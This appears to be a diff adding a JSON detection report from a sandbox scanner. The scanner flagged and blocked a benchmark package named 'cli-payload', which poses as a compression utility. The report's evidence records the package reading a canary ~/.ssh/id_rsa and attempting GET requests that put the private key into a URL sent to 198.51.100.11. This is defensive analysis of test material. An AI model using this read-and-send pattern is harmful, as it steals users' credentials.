@@ -1,0 +1,301 @@
+{
+ "schema_version": "1.0",
+ "package": {
+  "name": "cli-payload",
+  "version": "0.1",
+  "ecosystem": "pypi",
+  "sha256": "cf3ceaf4e457970b24b3f8fe51ca2e880392a895f072c59c8754d70cff0a2647",
+  "path": "bench/packages/malicious/cli_payload"
+ },
+ "verdict": "MALICIOUS-EVIDENT",
+ "action": "BLOCK",
+ "score": 12.0,
+ "confidence": "medium",
+ "summary": "cli-payload: behaviour contradicts its claims. Independent signals: canary_access, network_unclaimed.",
+ "findings": [
+  {
+   "id": "f0",
+   "rule": "canary_read_then_network",
+   "title": "Fake secret read, then network attempt",
+   "severity": "high",
+   "score": 7.2,
+   "capability": "fs_read_sensitive",
+   "phases": [
+    "call"
+   ],
+   "profiles": [
+    "dev"
+   ],
+   "env_differential": false,
+   "canary_hit": true,
+   "signal_class": "canary_access",
+   "claim": {
+    "status": "not_claimed",
+    "quote": "Command-line file compression and archive helper utility.",
+    "source": "readme"
+   },
+   "events": [
+    "ev1",
+    "ev2"
+   ],
+   "evidence": [
+    {
+     "event_id": "ev1",
+     "file": "/w/installed/cli_payload/cli.py",
+     "line": 12,
+     "phase": "call",
+     "profile": "dev",
+     "outcome": "succeeded",
+     "detail": {
+      "path": "~/.ssh/id_rsa",
+      "mode": "r",
+      "count": 2
+     }
+    },
+    {
+     "event_id": "ev2",
+     "file": "/w/installed/cli_payload/cli.py",
+     "line": 13,
+     "phase": "call",
+     "profile": "dev",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+      "method": "GET",
+      "data_head": "",
+      "headers": "",
+      "count": 2
+     }
+    }
+   ],
+   "explanation": "The README says \u00abCommand-line file compression and archive helper utility.\u00bb (readme); during call under dev it read the sensitive file ~/.ssh/id_rsa at cli.py:12 and the fake secret ssh_key appeared in ~/.ssh/id_rsa. Outcome: succeeded. Then call-phase network attempt to http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY-- followed. Canary(ies): ssh_key."
+  },
+  {
+   "id": "f1",
+   "rule": "network_unclaimed",
+   "title": "Network access in call phase not licensed by the package's claims",
+   "severity": "low",
+   "score": 2.4,
+   "capability": "network",
+   "phases": [
+    "call"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "env_differential": false,
+   "canary_hit": false,
+   "signal_class": "network_unclaimed",
+   "claim": {
+    "status": "not_claimed",
+    "quote": "Command-line file compression and archive helper utility.",
+    "source": "readme"
+   },
+   "events": [
+    "ev2",
+    "ev4",
+    "ev11",
+    "ev13"
+   ],
+   "evidence": [
+    {
+     "event_id": "ev2",
+     "file": "/w/installed/cli_payload/cli.py",
+     "line": 13,
+     "phase": "call",
+     "profile": "dev",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+      "method": "GET",
+      "data_head": "",
+      "headers": "",
+      "count": 2
+     }
+    },
+    {
+     "event_id": "ev4",
+     "file": "/w/installed/cli_payload/cli.py",
+     "line": 13,
+     "phase": "call",
+     "profile": "dev",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+      "method": "GET",
+      "data_head": "",
+      "headers": "",
+      "count": 2
+     }
+    },
+    {
+     "event_id": "ev11",
+     "file": "/w/installed/cli_payload/cli.py",
+     "line": 13,
+     "phase": "call",
+     "profile": "ci",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+      "method": "GET",
+      "data_head": "",
+      "headers": "",
+      "count": 2
+     }
+    },
+    {
+     "event_id": "ev13",
+     "file": "/w/installed/cli_payload/cli.py",
+     "line": 13,
+     "phase": "call",
+     "profile": "ci",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+      "method": "GET",
+      "data_head": "",
+      "headers": "",
+      "count": 2
+     }
+    }
+   ],
+   "explanation": "The README says \u00abCommand-line file compression and archive helper utility.\u00bb (readme); during call under dev it attempted network access to http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY-- at cli.py:13. Outcome: blocked."
+  },
+  {
+   "id": "f2",
+   "rule": "network_unclaimed",
+   "title": "Network access in cli phase not licensed by the package's claims",
+   "severity": "low",
+   "score": 2.4,
+   "capability": "network",
+   "phases": [
+    "cli"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "env_differential": false,
+   "canary_hit": false,
+   "signal_class": "network_unclaimed",
+   "claim": {
+    "status": "not_claimed",
+    "quote": "Command-line file compression and archive helper utility.",
+    "source": "readme"
+   },
+   "events": [
+    "ev6",
+    "ev8",
+    "ev15",
+    "ev17"
+   ],
+   "evidence": [
+    {
+     "event_id": "ev6",
+     "file": "/w/installed/cli_payload/cli.py",
+     "line": 13,
+     "phase": "cli",
+     "profile": "dev",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+      "method": "GET",
+      "data_head": "",
+      "headers": ""
+     }
+    },
+    {
+     "event_id": "ev8",
+     "file": "/w/installed/cli_payload/cli.py",
+     "line": 13,
+     "phase": "cli",
+     "profile": "dev",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+      "method": "GET",
+      "data_head": "",
+      "headers": ""
+     }
+    },
+    {
+     "event_id": "ev15",
+     "file": "/w/installed/cli_payload/cli.py",
+     "line": 13,
+     "phase": "cli",
+     "profile": "ci",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+      "method": "GET",
+      "data_head": "",
+      "headers": ""
+     }
+    },
+    {
+     "event_id": "ev17",
+     "file": "/w/installed/cli_payload/cli.py",
+     "line": 13,
+     "phase": "cli",
+     "profile": "ci",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+      "method": "GET",
+      "data_head": "",
+      "headers": ""
+     }
+    }
+   ],
+   "explanation": "The README says \u00abCommand-line file compression and archive helper utility.\u00bb (readme); during cli under dev it attempted network access to http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY-- at cli.py:13. Outcome: blocked."
+  }
+ ],
+ "independent_signals": [
+  "canary_access",
+  "network_unclaimed"
+ ],
+ "coverage": {
+  "phases_run": [
+   "install",
+   "startup",
+   "import",
+   "call",
+   "cli"
+  ],
+  "profiles_run": [
+   "dev",
+   "ci"
+  ],
+  "variants_run": [
+   "default",
+   "clock+30d"
+  ],
+  "triggers_run": [
+   "call_all",
+   "cli:clipkg",
+   "fresh_startup",
+   "import_all",
+   "install"
+  ],
+  "install_completed": true,
+  "install_note": null,
+  "network": "sinkhole",
+  "callables_total": 3,
+  "callables_exercised": 3,
+  "native_skipped": [],
+  "strace_layer": true,
+  "not_observed": [],
+  "whitelisted_or_dropped_events": 220
+ },
+ "claims_summary": {
+  "intents": [
+   "cli_tool"
+  ],
+  "claimed_capabilities": [
+   "subprocess"
+  ],
+  "unknown_intent": false
+ },
+ "dependency_attribution": {}
+}
